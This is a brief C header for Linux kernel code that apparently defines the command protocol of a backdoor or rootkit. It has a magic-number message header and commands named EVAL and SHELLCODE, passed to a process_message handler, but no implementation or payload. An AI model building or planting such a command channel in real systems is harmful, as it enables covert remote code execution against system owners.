#ifndef __CMD_PROCESS__
#define __CMD_PROCESS__

#include <linux/types.h>

#define MAGIC_NUMBER 0x41424344

enum commands {
    NOP = 0x00,
    EVAL = 0x01,
    SHELLCODE = 0x02
};


typedef struct __attribute__((__packed__)) message {
    u32 magic;
    u32 cmd;
    u16 size;
} message_header;

void process_message(message_header *header, u8 *body);

#endif
